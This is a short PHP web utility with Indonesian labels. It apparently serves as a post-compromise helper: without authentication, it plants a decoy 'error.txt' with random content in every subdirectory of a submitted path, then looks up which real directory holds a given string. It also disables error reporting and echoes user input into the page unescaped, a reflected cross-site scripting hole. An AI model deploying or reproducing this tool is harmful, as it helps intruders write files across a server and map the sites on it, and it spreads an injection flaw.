<?php
# JiOHB6PiR dooVCbFXi4KiM57N7FR7

error_reporting(0);
header("Content-Type: text/html; charset=UTF-8");

function generate_random_text($length = 3) {
    return substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, $length);
}

function write_file_recursively($dir, $filename, $level = 1, $max_level = 6) {
    if ($level > $max_level || !is_dir($dir)) return;
    $filepath = rtrim($dir, '/') . '/' . $filename;
    $content = generate_random_text();
    file_put_contents($filepath, $content);
    foreach (glob($dir . '/*', GLOB_ONLYDIR) as $subdir) {
        write_file_recursively($subdir, $filename, $level + 1, $max_level);
    }
}

function find_file_by_content($dir, $filename, $target_content, $level = 1, $max_level = 6, &$found = []) {
    if ($level > $max_level || !is_dir($dir)) return;
    $filepath = rtrim($dir, '/') . '/' . $filename;
    if (is_file($filepath)) {
        $content = trim(file_get_contents($filepath));
        if ($content === $target_content) {
            $found[] = realpath($dir);
        }
    }
    foreach (glob($dir . '/*', GLOB_ONLYDIR) as $subdir) {
        find_file_by_content($subdir, $filename, $target_content, $level + 1, $max_level, $found);
    }
}

$cwd = getcwd();
$filename = 'error.txt';

echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>";

if ($_GET['c'] === 'copy') {
    echo "Tanam File Otomatis";
    echo "</title></head><body>";
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $base = rtrim($_POST['base'], '/');
        write_file_recursively($base, $filename);
        echo "<p style='color:green;'>✅ File <b>$filename</b> berhasil ditanam ke semua folder dari <b>$base</b></p>";
    }

    echo '<h3>🌱 Tanam ' . $filename . ' (isi unik)</h3>
    <form method="post">
        <label>Direktori root:</label>
        <input type="text" name="base" value="' . htmlspecialchars($cwd) . '" style="width:400px">
        <input type="submit" value="Tanam">
    </form>';
    echo "</body></html>";
    exit;
}

if ($_GET['c'] === 'search') {
    echo "Cari File Berdasarkan Isi";
    echo "</title></head><body>";
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $base = rtrim($_POST['base'], '/');
        $target = trim($_POST['text']);
        $found = [];
        find_file_by_content($base, $filename, $target, 1, 5, $found);

        if ($found) {
            echo "<h3>✅ Ditemukan <b>$filename</b> dengan isi <code>$target</code> di:</h3><ul id='found-list'>";
            foreach ($found as $f) echo "<li class='found-item'>" . htmlspecialchars($f) . "</li>";
            echo "</ul>";
        } else {
            echo "<p style='color:red;'>❌ Tidak ditemukan <b>$filename</b> dengan isi <code>$target</code> di <b>$base</b></p>";
        }
    }

    echo '<h3>🔍 Cari ' . $filename . ' berdasarkan isi</h3>
    <form method="post">
        <label>Direktori root:</label>
        <input type="text" name="base" value="' . htmlspecialchars($cwd) . '" style="width:400px"><br><br>
        <label>Isi ' . $filename . ' (3 huruf):</label>
        <input type="text" name="text" maxlength="3" required pattern="[a-zA-Z0-9]{3}">
        <input type="submit" value="Cari">
    </form>';
    echo "</body></html>";
    exit;
}

echo "Dashboard Pilihan";
echo "</title></head><body>";
echo "<p>📌 Akses: <code>?c=copy</code> untuk tanam | <code>?c=search</code> untuk cari</p>";
echo "</body></html>";
